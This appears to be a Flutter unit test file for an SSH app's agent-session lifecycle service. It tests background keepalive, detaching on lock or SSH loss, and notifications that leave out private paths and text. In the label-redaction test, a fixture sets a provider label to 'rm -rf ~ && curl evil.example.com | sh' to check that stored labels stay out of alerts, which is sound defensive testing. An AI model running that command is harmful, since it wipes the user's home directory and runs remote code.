// ignore_for_file: public_member_api_docs

import 'dart:async';

import 'package:drift/native.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:monkeyssh/data/database/database.dart';
import 'package:monkeyssh/domain/models/acp_elicitation.dart';
import 'package:monkeyssh/domain/models/acp_provider.dart';
import 'package:monkeyssh/domain/models/acp_session_keys.dart';
import 'package:monkeyssh/domain/models/acp_session_state.dart';
import 'package:monkeyssh/domain/models/host_notifications.dart';
import 'package:monkeyssh/domain/services/acp_lifecycle_service.dart';
import 'package:monkeyssh/domain/services/acp_recent_sessions_service.dart';
import 'package:monkeyssh/domain/services/acp_session_manager.dart';
import 'package:monkeyssh/domain/services/diagnostics_log_service.dart';
import 'package:monkeyssh/domain/services/local_notification_service.dart';
import 'package:monkeyssh/domain/services/settings_service.dart';

import '../../helpers/acp_test_fakes.dart';
import '../../support/fake_acp_session_manager.dart';

class _RecordingAcpNotificationService extends LocalNotificationService {
  final calls =
      <
        ({
          int id,
          String title,
          String? subtitle,
          String body,
          AcpNotificationPayload payload,
        })
      >[];

  @override
  Future<void> showAcpNotification({
    required int notificationId,
    required String title,
    required String body,
    required AcpNotificationPayload payload,
    String? subtitle,
  }) async {
    calls.add((
      id: notificationId,
      title: title,
      subtitle: subtitle,
      body: body,
      payload: payload,
    ));
  }
}

FakeAcpBridgeConnector _createLifecycleConnector() => FakeAcpBridgeConnector(
  transportFactory: (_, _, _, {required takeOver}) => FakeAcpTransport(
    sync: false,
    autoReplyPrompt: true,
    agentCapabilities: const <String, Object?>{
      'loadSession': false,
      'sessionCapabilities': <String, Object?>{'resume': <String, Object?>{}},
    },
  ),
);

Future<void> _pump() => pumpAcpEventLoop();

/// Registers tests from acp_lifecycle_service_test.dart.
void registerDomainServicesAcpLifecycleServiceTests() {
  group('acp_lifecycle_service', () {
    late AppDatabase database;
    late SettingsService settings;
    late AcpRecentSessionsService recentSessions;
    late FakeAcpBridgeConnector connector;
    late AcpSessionManager manager;
    late LocalNotificationService notificationService;
    late Set<int> connectedHostIds;
    late AcpLifecycleService lifecycle;

    Future<AcpSessionKey> startSession({required int hostId}) async {
      final result = await manager.startNewSession(
        hostId: hostId,
        providerId: AcpBuiltinProviderIds.copilotCli,
        cwd: '/repo',
      );
      return (result as AcpSessionLaunchStarted).key;
    }

    setUp(() {
      database = AppDatabase.forTesting(NativeDatabase.memory());
      settings = SettingsService(database);
      recentSessions = AcpRecentSessionsService(settings);
      connector = _createLifecycleConnector();
      connectedHostIds = <int>{1, 2};
      manager = AcpSessionManager(
        connector: connector,
        recentSessions: recentSessions,
        isProUnlocked: () => true,
        diagnostics: const NoopDiagnosticsLogger(),
      );
      notificationService = LocalNotificationService();
      lifecycle = AcpLifecycleService(
        sessionManager: manager,
        hasActiveSshSession: (hostId) => connectedHostIds.contains(hostId),
        notificationService: notificationService,
        diagnostics: const NoopDiagnosticsLogger(),
      )..start();
    });

    tearDown(() async {
      await lifecycle.dispose();
      await manager.dispose();
      notificationService.dispose();
      await database.close();
    });

    group('background keepalive', () {
      test(
        'keeps every healthy session attached across app switching',
        () async {
          await startSession(hostId: 1);
          await startSession(hostId: 2);

          await lifecycle.handleBackground();
          await Future<void>.delayed(const Duration(milliseconds: 60));
          expect(
            manager.state.sessions.every(
              (session) => session.status == AcpConnectionStatus.ready,
            ),
            isTrue,
          );

          await lifecycle.handleForeground();
          expect(
            manager.state.sessions.every((session) => session.isLive),
            isTrue,
          );
        },
      );

      test('continues receiving agent requests while backgrounded', () async {
        final key = await startSession(hostId: 1);
        await lifecycle.handleBackground();
        // Suppress the platform notification side effect in this unit test; the
        // connectivity watcher is intentionally not invoked, so the attachment
        // remains live and exercises background update delivery.
        connectedHostIds.remove(1);

        connector.transports.values.single.requestPermission(key.acpSessionId);
        await _pump();

        expect(
          manager.state.byKeyValue(key.value)!.pendingPermissions,
          hasLength(1),
        );
        expect(
          manager.state.byKeyValue(key.value)!.status,
          AcpConnectionStatus.ready,
        );
      });
    });

    group('auth lock cleanup', () {
      test(
        'detaches every live session without stopping remote bridges',
        () async {
          await startSession(hostId: 1);
          await startSession(hostId: 2);

          await lifecycle.handleAuthLocked();

          expect(
            manager.state.sessions.every(
              (session) => session.status == AcpConnectionStatus.detached,
            ),
            isTrue,
          );
          expect(connector.stoppedBridges, isEmpty);
        },
      );

      test(
        'background stays live until lock and foreground does not reconnect',
        () async {
          final key = await startSession(hostId: 1);

          await lifecycle.handleBackground();
          await Future<void>.delayed(const Duration(milliseconds: 60));
          expect(
            manager.state.byKeyValue(key.value)!.status,
            AcpConnectionStatus.ready,
          );

          await lifecycle.handleAuthLocked();
          expect(
            manager.state.byKeyValue(key.value)!.status,
            AcpConnectionStatus.detached,
          );

          await lifecycle.handleForeground();
          await pumpEventQueue();
          expect(
            manager.state.byKeyValue(key.value)!.status,
            AcpConnectionStatus.detached,
          );
        },
      );
    });

    group('SSH disconnect cleanup', () {
      test(
        'detaches only the session whose host lost its SSH session',
        () async {
          await startSession(hostId: 1);
          await startSession(hostId: 2);

          connectedHostIds.remove(1);
          await lifecycle.handleSshConnectivityChanged();

          final byHost = {
            for (final s in manager.state.sessions) s.key.hostId: s,
          };
          expect(byHost[1]!.status, AcpConnectionStatus.detached);
          expect(byHost[2]!.status, AcpConnectionStatus.ready);
          expect(connector.stoppedBridges, isEmpty);
        },
      );
    });

    test(
      'background pending write emits a stable write-approval alert',
      () async {
        final key = fakeAcpKey();
        final initial = fakeAcpSession(key: key);
        final fakeManager = FakeAcpSessionManager(sessions: [initial]);
        final notifications = _RecordingAcpNotificationService();
        final testLifecycle = AcpLifecycleService(
          sessionManager: fakeManager,
          hasActiveSshSession: (_) => true,
          notificationService: notifications,
          diagnostics: const NoopDiagnosticsLogger(),
        )..start();
        addTearDown(testLifecycle.dispose);
        addTearDown(fakeManager.dispose);
        addTearDown(notifications.dispose);

        await _pump(); // Let the initial zero-pending snapshot reach the observer.
        await testLifecycle.handleBackground();
        fakeManager.emit(
          AcpSessionManagerState(
            sessions: [
              initial.copyWith(
                pendingWrites: [
                  AcpPendingWrite(
                    requestKey: 's:write-1',
                    sessionId: key.acpSessionId,
                    path: '/private/path-never-notified',
                    contentByteLength: 7,
                    requestedAt: DateTime(2026),
                  ),
                ],
              ),
            ],
          ),
        );
        await _pump();

        expect(notifications.calls, hasLength(1));
        expect(
          notifications.calls.single.payload.kind,
          AcpNotificationKind.writeApproval,
        );
        expect(
          notifications.calls.single.id,
          acpNotificationIdFor(notifications.calls.single.payload),
        );
        expect(notifications.calls.single.subtitle, isNull);
      },
    );

    test(
      'background alerts name the host and session in the subtitle',
      () async {
        final key = fakeAcpKey();
        final initial = fakeAcpSession(key: key, title: 'Fix login bug');
        final fakeManager = FakeAcpSessionManager(sessions: [initial]);
        final notifications = _RecordingAcpNotificationService();
        final testLifecycle = AcpLifecycleService(
          sessionManager: fakeManager,
          hasActiveSshSession: (_) => true,
          notificationService: notifications,
          resolveHostLabel: (hostId) async =>
              hostId == key.hostId ? 'devbox' : null,
          diagnostics: const NoopDiagnosticsLogger(),
        )..start();
        addTearDown(testLifecycle.dispose);
        addTearDown(fakeManager.dispose);
        addTearDown(notifications.dispose);

        await _pump();
        await testLifecycle.handleBackground();
        fakeManager.emit(
          AcpSessionManagerState(
            sessions: [
              initial.copyWith(
                pendingWrites: [
                  AcpPendingWrite(
                    requestKey: 's:write-1',
                    sessionId: key.acpSessionId,
                    path: '/private/path-never-notified',
                    contentByteLength: 7,
                    requestedAt: DateTime(2026),
                  ),
                ],
              ),
            ],
          ),
        );
        await _pump();

        expect(notifications.calls, hasLength(1));
        final call = notifications.calls.single;
        expect(call.title, 'Copilot CLI needs write approval');
        expect(call.subtitle, 'devbox · Fix login bug');
        expect(call.body, 'Open the app to review and respond.');
        // The working directory and write path never reach the notification.
        expect(call.subtitle, isNot(contains('/')));
      },
    );

    test(
      'a host whose "agent needs you" is off raises no approval alert',
      () async {
        final key = fakeAcpKey();
        final initial = fakeAcpSession(key: key);
        final fakeManager = FakeAcpSessionManager(sessions: [initial]);
        final notifications = _RecordingAcpNotificationService();
        var prefs = const HostNotificationPrefs(agentAttention: false);
        final testLifecycle = AcpLifecycleService(
          sessionManager: fakeManager,
          hasActiveSshSession: (_) => true,
          notificationService: notifications,
          resolveNotificationPrefs: (_) async => prefs,
          diagnostics: const NoopDiagnosticsLogger(),
        )..start();
        addTearDown(testLifecycle.dispose);
        addTearDown(fakeManager.dispose);
        addTearDown(notifications.dispose);

        await _pump();
        await testLifecycle.handleBackground();
        AcpPendingWrite write(String id) => AcpPendingWrite(
          requestKey: 's:$id',
          sessionId: key.acpSessionId,
          path: '/never',
          contentByteLength: 1,
          requestedAt: DateTime(2026),
        );
        fakeManager.emit(
          AcpSessionManagerState(
            sessions: [
              initial.copyWith(pendingWrites: [write('write-1')]),
            ],
          ),
        );
        await _pump();
        expect(notifications.calls, isEmpty);

        // "Agent finished" being off does not silence approvals.
        prefs = const HostNotificationPrefs(agentFinished: false);
        fakeManager.emit(
          AcpSessionManagerState(
            sessions: [
              initial.copyWith(
                pendingWrites: [write('write-1'), write('write-2')],
              ),
            ],
          ),
        );
        await _pump();
        expect(notifications.calls, hasLength(1));
      },
    );

    test('a new elicitation raises a content-free input alert', () async {
      final key = fakeAcpKey();
      final initial = fakeAcpSession(key: key);
      final fakeManager = FakeAcpSessionManager(sessions: [initial]);
      final notifications = _RecordingAcpNotificationService();
      final testLifecycle = AcpLifecycleService(
        sessionManager: fakeManager,
        hasActiveSshSession: (_) => true,
        notificationService: notifications,
        diagnostics: const NoopDiagnosticsLogger(),
      )..start();
      addTearDown(testLifecycle.dispose);
      addTearDown(fakeManager.dispose);
      addTearDown(notifications.dispose);

      await _pump();
      await testLifecycle.handleBackground();
      fakeManager.emit(
        AcpSessionManagerState(
          sessions: [
            initial.copyWith(
              pendingElicitations: [
                AcpSessionElicitation(
                  requestKey: 's:elicit-1',
                  requestedAt: DateTime(2026),
                  request: AcpElicitationRequest.parse(
                    {
                      'sessionId': key.acpSessionId,
                      'mode': 'url',
                      'elicitationId': 'oauth-1',
                      'url': 'https://private.example.com/secret-path',
                      'message': 'Private message never notified',
                    },
                    formSupported: true,
                    urlSupported: true,
                  ),
                ),
              ],
            ),
          ],
        ),
      );
      await _pump();

      final call = notifications.calls.single;
      expect(call.payload.kind, AcpNotificationKind.input);
      expect(call.title, 'Copilot CLI needs your input');
      expect(call.body, 'Open the app to review and respond.');
      for (final text in [call.title, call.body, call.subtitle ?? '']) {
        expect(text, isNot(contains('private')));
        expect(text, isNot(contains('Private')));
      }
    });

    test(
      'returning to the foreground during the host lookup drops the alert',
      () async {
        final key = fakeAcpKey();
        final initial = fakeAcpSession(key: key);
        final fakeManager = FakeAcpSessionManager(sessions: [initial]);
        final notifications = _RecordingAcpNotificationService();
        final hostLookup = Completer<String?>();
        final testLifecycle = AcpLifecycleService(
          sessionManager: fakeManager,
          hasActiveSshSession: (_) => true,
          notificationService: notifications,
          resolveHostLabel: (_) => hostLookup.future,
          diagnostics: const NoopDiagnosticsLogger(),
        )..start();
        addTearDown(testLifecycle.dispose);
        addTearDown(fakeManager.dispose);
        addTearDown(notifications.dispose);

        await _pump();
        await testLifecycle.handleBackground();
        fakeManager.emit(
          AcpSessionManagerState(
            sessions: [
              initial.copyWith(
                pendingWrites: [
                  AcpPendingWrite(
                    requestKey: 's:write-1',
                    sessionId: key.acpSessionId,
                    path: '/private/path-never-notified',
                    contentByteLength: 7,
                    requestedAt: DateTime(2026),
                  ),
                ],
              ),
            ],
          ),
        );
        await _pump();
        expect(notifications.calls, isEmpty);

        // The user opens the app while the label is still resolving.
        await testLifecycle.handleForeground();
        hostLookup.complete('devbox');
        await _pump();

        expect(notifications.calls, isEmpty);
      },
    );

    group('notification gating', () {
      test('never notifies while the app is in the foreground', () async {
        final key = await startSession(hostId: 1);
        final taps = <AcpNotificationPayload>[];
        notificationService.acpNotificationTaps.listen(taps.add);

        connector.transports.values.single.requestPermission(
          manager.state.byKeyValue(key.value)!.key.acpSessionId,
        );
        await _pump();

        // Foreground by default; no notification should have been requested.
        // We can't directly observe `showAcpNotification` without a plugin,
        // but we can confirm no tap stream activity occurs from a shown
        // notification (there is nothing to tap because nothing was shown).
        expect(taps, isEmpty);
      });

      test(
        'never notifies while backgrounded with no SSH path to the host',
        () async {
          final key = await startSession(hostId: 1);
          await lifecycle.handleBackground();
          connectedHostIds.remove(1);

          connector.transports.values.single.requestPermission(
            manager.state.byKeyValue(key.value)!.key.acpSessionId,
          );
          await _pump();

          // No exception and no crash is the primary contract here; there is
          // no host SSH path so no notification could ever be delivered.
        },
      );
    });

    group('disposal', () {
      test('dispose keeps healthy background sessions attached', () async {
        await startSession(hostId: 1);
        await lifecycle.handleBackground();
        await lifecycle.dispose();

        // Ordinary backgrounding never schedules a detach, even after disposal.
        await Future<void>.delayed(const Duration(milliseconds: 60));
        expect(manager.state.sessions.single.status, AcpConnectionStatus.ready);
      });

      test('dispose is idempotent', () async {
        await lifecycle.dispose();
        await lifecycle.dispose();
      });
    });

    group('notification label redaction', () {
      AcpSessionState fixture(String providerId) {
        final now = DateTime.now();
        return AcpSessionState(
          key: AcpSessionKey.of(
            hostId: 1,
            providerId: providerId,
            bridgeId: 'bridge-1',
            acpSessionId: 'session-1',
          ),
          providerLabel: 'rm -rf ~ && curl evil.example.com | sh',
          cwd: '/repo',
          status: AcpConnectionStatus.ready,
          createdAt: now,
          lastActivityAt: now,
        );
      }

      test('uses the fixed built-in label for a built-in provider', () {
        expect(
          acpSafeAgentDisplayLabel(fixture(AcpBuiltinProviderIds.copilotCli)),
          'Copilot CLI',
        );
        expect(
          acpSafeAgentDisplayLabel(fixture(AcpBuiltinProviderIds.openCode)),
          'OpenCode',
        );
      });

      test('falls back to the generic label for an unrecognized provider id, '
          'never the stored label', () {
        for (final providerId in ['custom-provider-id', 'builtin:future']) {
          final label = acpSafeAgentDisplayLabel(fixture(providerId));
          expect(label, acpGenericAgentLabel);
          expect(label, isNot(contains('rm -rf')));
        }
      });
    });
  });
}
